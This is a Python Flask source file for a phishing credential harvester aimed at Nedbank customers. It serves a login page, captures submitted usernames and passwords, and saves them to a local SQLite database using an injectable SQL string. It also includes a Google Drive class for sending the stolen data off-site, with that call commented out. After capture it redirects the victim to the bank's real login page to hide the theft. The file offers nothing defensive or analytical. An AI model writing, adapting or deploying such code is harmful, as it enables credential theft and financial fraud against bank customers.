from flask import Flask, render_template, request, redirect
import sqlite3
from pydrive.auth import GoogleAuth
from pydrive.drive import GoogleDrive
app = Flask(__name__)
CREDS_FILE = "creds.json"
@app.route('/')
def hello_world():
    return render_template('st.html')

@app.route('/get_user',methods=['POST'])
def user():
    if request.user_agent.string.startswith('Mozilla'):
        user = request.form.get('username')
        pas = request.form.get('password')
        con = sqlite3.connect('credentials.db')
        cur = con.cursor()
        cur.execute(f"INSERT INTO users VALUES ('{str(user)}', '{str(pas)}')")
        con.commit()
        con.close()
        print("done")
        print_db()
        data=f"username: {str(user)} \n password: {str(pas)}"
        gd=googleDrive()
       # gd.create_file("info.txt",data)
    return redirect("https://secured-id.nedbank.co.za/mga/sps/authsvc?PolicyId=urn:ibm:security:authentication:asf:nidlogin&TAM_OP=login&USERNAME=unauthenticated&URL=%2F")

def print_db():
    con = sqlite3.connect('credentials.db')
    cur = con.cursor()
    cur.execute('SELECT * FROM users')
    rows = cur.fetchall()
    for row in rows:
        print(row)


class googleDrive:

    def __init__(self):
        gauth = self.auth()
        self.drive = GoogleDrive(gauth)

    def countdown(self, t):
        while t:
            mins, secs = divmod(t, 60)
            timer = '{:02d}:{:02d}'.format(mins, secs)
            print(timer, end="\r")
            time.sleep(1)
            t -= 1

    def auth(self):
        gauth = GoogleAuth()
        gauth.LoadCredentialsFile(CREDS_FILE)
        return gauth

    def upload_file(self,filename, data):
        file = self.find(filename)
        file.SetContentString(data)  # this writes a string directly to a file
        file.Upload()
        print('file has been uploaded')


    def find(self, file_name):
        file_list = self.drive.ListFile({'q': f"title contains '{file_name}' and trashed=false"}).GetList()
        print(file_list[0]['title'])  # should be the title of the file we just created
        return file_list[0]

    def download_file_data(self, google_drive_file_name, saved_path):
        file = self.find(google_drive_file_name)
        file.GetContentFile(f'{saved_path}')
        return  saved_path

    def create_file(self,name,data):
        file = self.drive.CreateFile({'title': name})
        file.SetContentString(data)  # this writes a string directly to a file
        file.Upload()

if __name__ == '__main__':
    app.run(port=80)